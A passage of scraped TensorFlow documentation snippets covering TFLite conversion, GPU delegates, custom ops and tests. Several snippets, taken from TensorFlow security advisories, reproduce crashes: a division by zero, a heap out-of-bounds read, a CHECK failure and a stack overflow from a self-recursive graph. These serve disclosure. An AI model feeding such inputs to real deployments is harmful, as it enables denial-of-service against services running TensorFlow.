converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [func.get_concrete_function()], func)
converter.target_spec.supported_ops = [
    tf.lite.OpsSet.TFLITE_BUILTINS,
    tf.lite.OpsSet.SELECT_TF_OPS,
]
fb_model = converter.convert()

tf.lite.experimental.Analyzer.analyze(model_content=fb_model, gpu_compatibility=True)
```

----------------------------------------

TITLE: Querying Custom Op Types with tfprof Shell
DESCRIPTION: Demonstrates loading the custom op log file into the tfprof interactive shell using `--op_log_path`. It then uses the `scope` command with `-account_type_regexes pool_logit` to filter and display operations that were assigned the custom type 'pool_logit', showing their parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/command_line.md#_snippet_2

LANGUAGE: shell
CODE:
```
tfprof> scope -account_type_regexes pool_logit -max_depth 4 -select params
```

----------------------------------------

TITLE: Creating IndexTable (string->int64) from File - Python
DESCRIPTION: Demonstrates creating a tf.lookup.index_table_from_tensor from a vocabulary read from a file, mapping strings to indices (int64). It reads words from '/tmp/vocab.file', creates the index table with a default value for unknown words, defines a placeholder for string input, and sets up the lookup operation with table initialization dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_3

LANGUAGE: Python
CODE:
```
with open('/tmp/vocab.file', 'r') as f:
  words = f.read().splitlines()

UNK_ID = -1
vocab = tf.constant(words)
vocab_table = tf.lookup.index_table_from_tensor(vocab, default_value=UNK_ID)

input_tensor = tf.compat.v1.placeholder(tf.string, shape=[5])

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  out_tensor = vocab_table.lookup(input_tensor)
```

----------------------------------------

TITLE: Install CMake on Ubuntu (apt-get)
DESCRIPTION: Installs the required CMake tool version 3.16 or higher using the apt-get package manager on Ubuntu. This command requires superuser privileges (`sudo`). It is a prerequisite for building TensorFlow Lite with CMake.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_cmake.md#_snippet_0

LANGUAGE: sh
CODE:
```
sudo apt-get install cmake
```

----------------------------------------

TITLE: Getting Generated Metadata JSON (Python)
DESCRIPTION: Retrieves the generated metadata as a JSON string before it has been populated into the TFLite model buffer. This string might not contain fields added during the population process, such as minimum parser version.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/nl_classifier/MetadataWriter.md#_snippet_4

LANGUAGE: Python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Implementing OpKernelShim Interface (C++)
DESCRIPTION: Provides the skeletal structure of a C++ class implementing the OpKernelShim interface using the Curiously Recurring Template Pattern (CRTP). It defines the static methods required for attribute, input, and output declarations, shape inference, and the core Init and Invoke methods.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/shim/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
template<TfRuntime R>
class MyOp : public OpKernelShim<MyOp, R> {

  // Attributes declaration (syntax: https://www.tensorflow.org/guide/create_op)
  static std::vector<std::string> Attrs();

  // Input tensors declaration (syntax: https://www.tensorflow.org/guide/create_op)
  static std::vector<std::string> Inputs();

  // Output tensors declaration (syntax: https://www.tensorflow.org/guide/create_op)
  static std::vector<std::string> Outputs();

  // Initializes the op
  absl::Status Init(InitContext* ctx);

  // Runs the operation
  absl::Status Invoke(InvokeContext* ctx);

  // Shape inference
  static absl::Status ShapeInference(ShapeInferenceContext* ctx);
};
```

----------------------------------------

TITLE: Testing Custom TensorFlow Op with Integers (Python)
DESCRIPTION: A test case using `tf.test.TestCase` to verify the custom multiplex op with integer inputs. It compares the op's output against `np.where` and is configured to run in both TensorFlow graph and eager execution modes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_2/README.md#_snippet_7

LANGUAGE: python
CODE:
```
  @test_util.run_in_graph_and_eager_modes
  def test_multiplex_int(self):
    a = tf.constant([1, 2, 3, 4, 5], dtype=tf.int64)
    b = tf.constant([10, 20, 30, 40, 50], dtype=tf.int64)
    cond = tf.constant([True, False, True, False, True], dtype=bool)
    expect = np.where(self.evaluate(cond), self.evaluate(a), self.evaluate(b))
    # expected result is [1, 20, 3, 40, 5]
    result = multiplex_2_op.multiplex(cond, a, b)
    self.assertAllEqual(result, expect)
```

----------------------------------------

TITLE: Implementing Custom Embedding Layer Python
DESCRIPTION: This Python class implements a basic Embedding layer. It initializes weights randomly and performs a lookup operation using `tnp.take` on the input indices.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
class Embedding:

  def __init__(self, vocab_size, embedding_dim):
    self._vocab_size = vocab_size
    self._embedding_dim = embedding_dim
    self._built = False

  def __call__(self, inputs):
    if not self._built:
      self.build(inputs)
    return tnp.take(self.weights, inputs, axis=0)

  def build(self, inputs):
    del inputs
    self.weights = tf.Variable(tnp.random.randn(
        self._vocab_size, self._embedding_dim).astype(np.float32))
    self._built = True
```

----------------------------------------

TITLE: Creating AudioRecord TFLite AudioEmbedder Python
DESCRIPTION: Creates an instance of the `AudioRecord` class, which is used to handle and process audio input data for the AudioEmbedder. Returns a `AudioRecord` object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_2

LANGUAGE: python
CODE:
```
create_audio_record() -> tflite_support.task.audio.AudioRecord
```

----------------------------------------

TITLE: Running TensorFlow C++ Label Image Demo Custom Image Bash
DESCRIPTION: Executes the C++ label image binary, specifying a custom image file to classify using the `--image` flag. This allows users to test the model on their own images. The specified image file must be accessible to the program, and the C++ binary must be present in the bazel-bin directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/label_image/README.md#_snippet_3

LANGUAGE: bash
CODE:
```
bazel-bin/tensorflow/examples/label_image/label_image --image=my_image.png
```

----------------------------------------

TITLE: Illustrating 2D Convolution with Padding and Striding CPP Pseudo-code
DESCRIPTION: This pseudo-code snippet demonstrates the core loops and calculations involved in a 2D convolution operation within XLA. It iterates through output coordinates and kernel coordinates to compute the value at each output position, considering strides and padding. The snippet assumes input, kernel, stride, and padding values are available.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_10

LANGUAGE: cpp
CODE:
```
for (b, oz, oy, ox) {  // output coordinates
  value = 0;
  for (iz, ky, kx) {  // kernel coordinates and input z
    iy = oy*stride_y + ky - pad_low_y;
    ix = ox*stride_x + kx - pad_low_x;
    if ((iy, ix) inside the base area considered without padding) {
      value += input(b, iz, iy, ix) * kernel(oz, iz, ky, kx);
    }
  }
  output(b, oz, oy, ox) = value;
}
```

----------------------------------------

TITLE: Creating TensorAudio Input with AudioClassifier Python
DESCRIPTION: Creates a TensorAudio instance designed to hold the audio input data for the AudioClassifier. This helper method ensures the TensorAudio object is initialized correctly according to the requirements of the loaded model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_5

LANGUAGE: Python
CODE:
```
create_input_tensor_audio() -> <a href="../../../tflite_support/task/audio/TensorAudio"><code>tflite_support.task.audio.TensorAudio</code></a>
```

----------------------------------------

TITLE: Using BertQuestionAnswerer C++ API
DESCRIPTION: This snippet demonstrates the sample usage of a custom C++ TensorFlow Lite Task API, specifically the BertQuestionAnswerer. It shows how to instantiate the API by loading a TFLite model from a file path using `CreateFromFile` and then invoke the `Answer` method with context and question strings to obtain the prediction results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/customized_task_api.md#_snippet_0

LANGUAGE: C++
CODE:
```
  char kBertModelPath[] = "path/to/model.tflite";
  // Create the API from a model file
  std::unique_ptr<BertQuestionAnswerer> question_answerer =
      BertQuestionAnswerer::CreateFromFile(kBertModelPath);

  char kContext[] = ...; // context of a question to be answered
  char kQuestion[] = ...; // question to be answered
  // ask a question
  std::vector<QaAnswer> answers = question_answerer.Answer(kContext, kQuestion);
  // answers[0].text is the best answer
```

----------------------------------------

TITLE: Initializing FeaturePropertiesT from Buffer in Python
DESCRIPTION: A class method to initialize a `FeaturePropertiesT` object from a given buffer at a specific position. Used for deserializing data from a FlatBuffers buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeaturePropertiesT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Testing TensorFlow Hash Table in tf.function (Python)
DESCRIPTION: This parameterized test calls the `_use_table` helper function wrapped inside `tf.function`. It explicitly creates the `tf.function` to control the resource lifecycle. The test evaluates the function's output and asserts the results, demonstrating resource destruction upon function return and parameterized testing across data types.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_20

LANGUAGE: Python
CODE:
```
  def test_find_insert_find_tf_function(self, key_dtype, value_dtype):
    results = def_function.function(
        lambda: self._use_table(key_dtype, value_dtype))
    self.assertAllClose(self.evaluate(results), [-999.0, 100.0, -999.0])
```

----------------------------------------

TITLE: Preprocessing Test Dataset with MoveNet (Python)
DESCRIPTION: Processes the test image dataset to extract pose landmarks using `MoveNetPreprocessor`. It reads images from `images_in_test_folder` and saves the extracted landmark data and labels to the specified test CSV file, `csvs_out_test_path`. This is done only if preprocessing is not skipped.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_10

LANGUAGE: Python
CODE:
```
if not is_skip_step_1:
  images_in_test_folder = os.path.join(IMAGES_ROOT, 'test')
  images_out_test_folder = 'poses_images_out_test'
  csvs_out_test_path = 'test_data.csv'

  preprocessor = MoveNetPreprocessor(
      images_in_folder=images_in_test_folder,
      images_out_folder=images_out_test_folder,
      csvs_out_path=csvs_out_test_path,
  )

  preprocessor.process(per_pose_class_limit=None)
```

----------------------------------------

TITLE: Rebuilding TensorFlow Devel Docker Image - Bash
DESCRIPTION: This command rebuilds the TensorFlow development Docker image locally. It uses BuildKit for potentially faster and more flexible builds, specifies a Python version (3.9 in this example), targets the 'devel' stage, tags the resulting image as 'my-tf-devel', and builds from the current directory ('.'). It's typically used to test local changes to the Dockerfile source files before submitting a PR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
DOCKER_BUILDKIT=1 docker build \
  --build-arg PYTHON_VERSION=python3.9 --target=devel -t my-tf-devel .
```

----------------------------------------

TITLE: Configuring & Applying TFLite GPU Delegate Serialization C++
DESCRIPTION: This snippet configures the TensorFlow Lite GPU delegate (V2) to enable the serialization feature in C++. It sets the experimental flag `TFLITE_GPU_EXPERIMENTAL_FLAGS_ENABLE_SERIALIZATION`, specifies the directory for serialization data (`kTmpDir`), and provides a unique model token (`kModelToken`). It then creates the delegate with these options and attempts to apply it to the interpreter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/gpu.md#_snippet_0

LANGUAGE: C++
CODE:
```
    TfLiteGpuDelegateOptionsV2 options = TfLiteGpuDelegateOptionsV2Default();
    options.experimental_flags |= TFLITE_GPU_EXPERIMENTAL_FLAGS_ENABLE_SERIALIZATION;
    options.serialization_dir = kTmpDir;
    options.model_token = kModelToken;

    auto* delegate = TfLiteGpuDelegateV2Create(options);
    if (interpreter->ModifyGraphWithDelegate(delegate) != kTfLiteOk) return false;
```

----------------------------------------

TITLE: Creating Opaque GPU Delegate with TFLite Play Services C
DESCRIPTION: This C code snippet demonstrates how to create the opaque GPU delegate instance when using TensorFlow Lite in Google Play Services via the C API. It utilizes the `flatbuffers` library to create `TFLiteSettings`, retrieves the opaque delegate plugin via `TfLiteGpuDelegatePluginCApi()`, and then creates the delegate object using the plugin's `create` function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_native.md#_snippet_6

LANGUAGE: c
CODE:
```
#include "flatbuffers/flatbuffers.h"
#include "tensorflow/lite/acceleration/configuration/configuration_generated.h"

flatbuffers::FlatBufferBuilder fbb;
tflite::TFLiteSettingsBuilder builder(fbb);
const tflite::TFLiteSettings* tflite_settings =
    flatbuffers::GetTemporaryPointer(fbb, builder.Finish());

const TfLiteOpaqueDelegatePlugin* pluginCApi = TfLiteGpuDelegatePluginCApi();
TfLiteOpaqueDelegate* gpu_delegate = pluginCApi->create(tflite_settings);
```

----------------------------------------

TITLE: Demonstrating TensorFlow RaggedTensorToVariant Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger a `CHECK` failure in the `tf.raw_ops.RaggedTensorToVariant` operation by providing `rt_nested_splits` with an unexpected shape/rank, potentially leading to a denial of service. It requires the TensorFlow library. The parameters `rt_nested_splits` and `rt_dense_values` are simple constant tensors, and `batched_input` is set to True.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-111.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

batched_input = True
rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
rt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)
tf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)
```

----------------------------------------

TITLE: Loading ESC50 Dataset with AudioDataLoader (Python)
DESCRIPTION: Class method to load the ESC50 audio dataset following its specified file structure. Requires an `audio_spec.YAMNet` instance (`spec`) and the root dataset path (`data_path`), which should contain `audio/` and `meta/esc50.csv` subdirectories. Allows filtering by specific folds and categories, shuffling data, and caching intermediate results for performance. Returns an `AudioDataLoader` instance containing the loaded audio samples and corresponding labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/DataLoader.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
from_esc50(
    spec, data_path, folds=None, categories=None, shuffle=True, cache=False
)
```

----------------------------------------

TITLE: Defining nvidia-cufft-cu12 Dependency
DESCRIPTION: Specifies the exact version (11.2.3.61) for the 'nvidia-cufft-cu12' package and includes multiple SHA256 hashes. This entry defines the required version of the cuFFT library for CUDA 12, used for Fast Fourier Transforms, and ensures its integrity during installation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/requirements_lock_3_12.txt#_snippet_5

LANGUAGE: Python Requirements
CODE:
```
nvidia-cufft-cu12==11.2.3.61 \
    --hash=sha256:4a8f6f0ce93c52a50ee83422a80472b5f376054a63f38532d0eab4007e7ef28b \
    --hash=sha256:6d45b48a5ee7599e57131129cda2c58544d9b78b95064d3ec3e5c6b96e2b58cc \
    --hash=sha256:9a6e8df162585750f61983a638104a48c756aa13f9f48e19ab079b38e3c828b8
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with GPU Delegate in C++
DESCRIPTION: This C++ snippet demonstrates the basic steps to load a TFLite model, set up an interpreter builder, integrate the GPU delegate using `TfLiteGpuDelegateV2Create`, finalize the interpreter, run inference, and clean up the delegate. It highlights the key delegate integration steps.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/gpu/README.md#_snippet_0

LANGUAGE: c++
CODE:
```
////////
// Set up InterpreterBuilder.
auto model = FlatBufferModel::BuildFromFile(model_path);
ops::builtin::BuiltinOpResolver op_resolver;
InterpreterBuilder interpreter_builder(*model, op_resolver);

////////
// NEW: Prepare GPU delegate.
auto* delegate = TfLiteGpuDelegateV2Create(/*default options=*/nullptr);
interpreter_builder.AddDelegate(delegate);

////////
// Set up Interpreter.
std::unique_ptr<Interpreter> interpreter;
if (interpreter_builder(&interpreter) != kTfLiteOk) return;

////////
// IMPORTANT: AllocateTensors can be called only AFTER ModifyGraphWithDelegate

////////
// Run inference.
WriteToInputTensor(interpreter->typed_input_tensor<float>(0));
if (interpreter->Invoke() != kTfLiteOk) return;
ReadFromOutputTensor(interpreter->typed_output_tensor<float>(0));

////////
// Clean up.
TfLiteGpuDelegateV2Delete(delegate);
```

----------------------------------------

TITLE: Bitcasting F16 to F32 in XLA HLO
DESCRIPTION: This snippet illustrates using the `bitcast-convert` operation in XLA HLO to convert a tensor of `f16` elements to a tensor of `f32` elements. Since the input element size (f16, 2 bytes) is smaller than the output element size (f32, 4 bytes), the last dimension of the input shape is required to be equal to the size ratio (4/2 = 2), and this dimension is dropped in the output. The input `f16[10,2]{1,0}` converts to `f32[10]{0}`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_3

LANGUAGE: XLA HLO
CODE:
```
f32[10]{0} %output = f32[10]{0} bitcast-convert(f16[10,2]{1,0} %input)
```

----------------------------------------

TITLE: Running TFLite Model Inference - Python
DESCRIPTION: Shows how to get and run the `infer` signature from a TFLite `Interpreter` in Python. It takes input data (`test_images`), runs the inference, and then uses NumPy to process the model's output (`result["output"]`) to determine the predicted class labels by finding the index of the maximum value along axis 1. It also gets the true labels for comparison.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_21

LANGUAGE: Python
CODE:
```
infer = another_interpreter.get_signature_runner("infer")
result = infer(x=test_images)
predictions = np.argmax(result["output"], axis=1)

true_labels = np.argmax(test_labels, axis=1)
```

----------------------------------------

TITLE: Accessing Node Tensor Types in MakeEdge C++
DESCRIPTION: This snippet shows the specific lines within the `MakeEdge` function where `output_type` and `input_type` methods are called using `output_index` and `input_index` respectively. The vulnerability occurs because these indices are not validated against the bounds of the underlying arrays, leading to potential out-of-bounds heap access when loading a saved model, as described in the security advisory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-034.md#_snippet_0

LANGUAGE: C++
CODE:
```
  DataType src_out = src->output_type(output_index);
  DataType dst_in = dst->input_type(input_index);
  //...
```

----------------------------------------

TITLE: Implementing TensorFlow Hash Table Create Kernel (C++)
DESCRIPTION: Implements the `Compute` method for the `SimpleHashTableCreateOpKernel`, responsible for allocating a `DT_RESOURCE` tensor and creating a reference-counted `SimpleHashTableResource` handle using `ResourceHandle::MakeRefCountingHandle` to manage the resource's lifecycle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_11

LANGUAGE: C++
CODE:
```
template <class K, class V>
class SimpleHashTableCreateOpKernel : public OpKernel {
 public:
  explicit SimpleHashTableCreateOpKernel(OpKernelConstruction* ctx)
      : OpKernel(ctx) {}

  void Compute(OpKernelContext* ctx) override {
    Tensor handle_tensor;
    AllocatorAttributes attr;
    OP_REQUIRES_OK(ctx, ctx->allocate_temp(DT_RESOURCE, TensorShape({}),
                                           &handle_tensor, attr));
    handle_tensor.scalar<ResourceHandle>()() =
        ResourceHandle::MakeRefCountingHandle(
            new SimpleHashTableResource<K, V>(), ctx->device()->name(),
            /*dtypes_and_shapes=*/{}, ctx->stack_trace());
    ctx->set_output(0, handle_tensor);
  }

 private:
  // Just to be safe, avoid accidentally copying the kernel.
  SimpleHashTableCreateOpKernel(const SimpleHashTableCreateOpKernel&) = delete;
  void operator=(const SimpleHashTableCreateOpKernel&) = delete;
};
```

----------------------------------------

TITLE: Creating TFLite Associated File Flatbuffers Metadata - Python
DESCRIPTION: Generates the associated file metadata as a Flatbuffers Python object. This method is called on an initialized `AssociatedFileMd` instance and converts the stored metadata attributes into the format required for embedding within a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/AssociatedFileMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> <a href="../../../tflite_support/metadata_schema_py_generated/AssociatedFileT"><code>tflite_support.metadata_schema_py_generated.AssociatedFileT</code></a>
```

----------------------------------------

TITLE: Calculating Batch Count and Initializing BatchedMap in TensorFlow C++
DESCRIPTION: This C++ snippet from TensorFlow's count operations calculates the number of batches based on the 'splits' tensor's elements and initializes a 'BatchedMap' data structure. The vulnerability arises here if 'num_batches' becomes less than 1 due to an invalid 'splits' input, potentially leading to an abort when 'BatchedMap' expects at least one element. It depends on the 'splits' tensor and the 'BatchedMap' utility.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-017.md#_snippet_0

LANGUAGE: C++
CODE:
```
    int num_batches = splits.NumElements() - 1;
    auto per_batch_counts = BatchedMap<W>(num_batches);
```

----------------------------------------

TITLE: Run TFLite Benchmark Activity with Tracing Enabled
DESCRIPTION: This command starts the BenchmarkModelActivity using 'adb shell am start' when platform tracing has been enabled. It runs the benchmark with the specified graph and arguments while the system is configured to record TFLite internal events for analysis.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/benchmark/android/README.md#_snippet_8

LANGUAGE: Shell
CODE:
```
adb shell am start -S \
  -n org.tensorflow.lite.benchmark/.BenchmarkModelActivity \
  --es args '"--graph=/data/local/tmp/mobilenet_quant_v1_224.tflite \
  --num_threads=4"'
```

----------------------------------------

TITLE: Converting GraphDef Allowing Select TensorFlow Operators via Bazel
DESCRIPTION: This command performs the same conversion as the previous snippet (allowing select TF ops) but uses the `bazel run` command. When building and running `tflite_convert` with Bazel for this functionality, the `--define=tflite_convert_with_select_tf_ops=true` flag is required.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/cmdline_examples.md#_snippet_7

LANGUAGE: Shell
CODE:
```
bazel run --define=tflite_convert_with_select_tf_ops=true tflite_convert -- \
  --graph_def_file=/tmp/foo.pb \
  --output_file=/tmp/foo.tflite \
  --input_arrays=input \
  --output_arrays=MobilenetV1/Predictions/Reshape_1 \
  --target_ops=TFLITE_BUILTINS,SELECT_TF_OPS
```

----------------------------------------

TITLE: Reproducing Division by 0 in TensorFlow QuantizedConv2D Python
DESCRIPTION: This Python snippet demonstrates how to trigger the division-by-zero vulnerability in `tf.raw_ops.QuantizedConv2D` by providing a zero-sized filter (`shape=[1, 0, 1, 1]`). This input configuration causes `filter_value_count` to become zero in the underlying C++ implementation, leading to a crash during the division.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-016.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)
filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)
min_input = tf.constant(0.0)
max_input = tf.constant(0.0001)
min_filter = tf.constant(0.0)
max_filter = tf.constant(0.0001)
strides = [1, 1, 1, 1]
padding = "SAME"


tf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)
```

----------------------------------------

TITLE: Grouping SparseTensor Entries C++
DESCRIPTION: Demonstrates how to iterate through a SparseTensor and group entries based on specified dimensions. It shows how to access the group index, indices, and values for each group and emphasizes the requirement for the tensor's order to match or be reordered according to the grouping dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/util/sparse/README.md#_snippet_0

LANGUAGE: C++
CODE:
```
Tensor indices(DT_INT64, TensorShape({N, NDIMS});
Tensor values(DT_STRING, TensorShape({N});
TensorShape shape({dim0,...});
SparseTensor sp(indices, vals, shape);
sp.Reorder<tstring>({1, 2, 0, 3, ...}); // Must provide NDIMS dims.
// group according to dims 1 and 2
for (const auto& g : sp.group({1, 2})) {
  cout << "vals of ix[:, 1,2] for this group: "
       << g.group()[0] << ", " << g.group()[1];
  cout << "full indices of group:\\n" << g.indices();
  cout << "values of group:\\n" << g.values();

  TTypes<int64>::UnalignedMatrix g_ix = g.indices();
  TTypes<tstring>::UnalignedVec g_v = g.values();
  ASSERT(g_ix.dimension(0) == g_v.size());  // number of elements match.
}
```

----------------------------------------

TITLE: Triggering TensorFlow FractionalAvgPoolGrad Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the heap out-of-bounds access vulnerability (CVE-2022-21730) in `tf.raw_ops.FractionalAvgPoolGrad`. It defines a TensorFlow function calling the operation with specifically crafted, invalid `row_pooling_sequence` and `col_pooling_sequence` parameters that exploit the vulnerability by attempting to access memory outside of the tensor bounds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-005.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

@tf.function
def test():
  y = tf.raw_ops.FractionalAvgPoolGrad(
    orig_input_tensor_shape=[2,2,2,2],
    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],
    row_pooling_sequence=[-10,1,2,3],
    col_pooling_sequence=[1,2,3,4],
    overlapping=True)
  return y

test()
```

----------------------------------------

TITLE: Defining Self-Recursive Function in TensorFlow GraphDef (TextProto)
DESCRIPTION: This code snippet shows an example of a self-recursive function definition within a TensorFlow GraphDef in text format. The 'function' named "SomeOp" contains 'node_def' entries whose 'op' attribute refers back to "SomeOp" itself. This structure violates the expected invariants of GraphDef and can lead to a stack overflow when processed by the TensorFlow runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-054.md#_snippet_0

LANGUAGE: TextProto
CODE:
```
  library {
    function {
      signature {
        name: "SomeOp"
        description: "Self recursive op"
      }
      node_def {
        name: "1"
        op: "SomeOp"
      }
      node_def {
        name: "2"
        op: "SomeOp"
      }
    }
  }
```

----------------------------------------

TITLE: Defining BoundingBoxType Constants in Python
DESCRIPTION: These constants are part of the `BoundingBoxType` class, acting as an enumeration to specify the format of bounding box coordinates in TFLite metadata. Each constant is assigned a unique integer value.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxType.md#_snippet_0

LANGUAGE: python
CODE:
```
UNKNOWN = 0
BOUNDARIES = 1
UPPER_LEFT = 2
CENTER = 3
```

----------------------------------------

TITLE: Initializing GeneralMd Class in Python
DESCRIPTION: This snippet shows the constructor for the `GeneralMd` class, used to create an instance holding common TFLite model metadata. Parameters allow setting the model's name, version, description, author, and licenses, all of which are optional.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/GeneralMd.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.metadata_info.GeneralMd(
    name: Optional[str] = None,
    version: Optional[str] = None,
    description: Optional[str] = None,
    author: Optional[str] = None,
    licenses: Optional[str] = None
)
```

----------------------------------------

TITLE: Implementing a Dense Layer (Python)
DESCRIPTION: Defines a `Dense` class inheriting from `tf.Module`. This class implements a standard fully connected layer with an optional ReLU activation. It initializes weights and biases as `tf.Variable`s and performs matrix multiplication and addition using `tf.experimental.numpy`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_Numpy_Distributed_Image_Classification.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
class Dense(tf.Module):

  def __init__(self, units, use_relu=True):
    self.wt = None
    self.bias = None
    self._use_relu = use_relu
    self._built = False
    self._units = units

  def __call__(self, inputs):
    if not self._built:
      self._build(inputs.shape)
    x = tnp.add(tnp.matmul(inputs, self.wt), self.bias)
    if self._use_relu:
      return tnp.maximum(x, 0.)
    else:
      return x

  @property
  def params(self):
    assert self._built
    return [self.wt, self.bias]

  def _build(self, input_shape):
    size = input_shape[1]
    stddev = 1 / tnp.sqrt(size)
    # Note that model parameters are `tf.Variable` since they requires
    # mutation, which is currently unsupported by TensorFlow NumPy.
    # Also note interoperation with TensorFlow APIs below.
    self.wt = tf.Variable(
        tf.random.truncated_normal(
            [size, self._units], stddev=stddev, dtype=tf.float32))
    self.bias = tf.Variable(tf.zeros([self._units], dtype=tf.float32))
    self._built = True
```

----------------------------------------

TITLE: Initializing and Using Java Hexagon Delegate
DESCRIPTION: Illustrates how to create and use the HexagonDelegate instance in Java, including handling the UnsupportedOperationException if the delegate is not available, adding it to Interpreter.Options, and ensuring proper cleanup by closing both the interpreter and the delegate after inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/hexagon.md#_snippet_2

LANGUAGE: Java
CODE:
```
import org.tensorflow.lite.HexagonDelegate;

// Create the Delegate instance.
try {
  hexagonDelegate = new HexagonDelegate(activity);
  tfliteOptions.addDelegate(hexagonDelegate);
} catch (UnsupportedOperationException e) {
  // Hexagon delegate is not supported on this device.
}

tfliteInterpreter = new Interpreter(tfliteModel, tfliteOptions);

// Dispose after finished with inference.
tfliteInterpreter.close();
if (hexagonDelegate != null) {
  hexagonDelegate.close();
}
```

----------------------------------------

TITLE: Visualize Quantization Metrics per Layer Python
DESCRIPTION: Generates bar plots using matplotlib to visualize the 'range' and 'rmse/scale' metrics for each layer listed in the debugger statistics DataFrame. This visual representation helps in quickly spotting outliers indicating potential quantization issues.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_12

LANGUAGE: Python
CODE:
```
plt.figure(figsize=(15, 5))
ax1 = plt.subplot(121)
ax1.bar(np.arange(len(layer_stats)), layer_stats['range'])
ax1.set_ylabel('range')
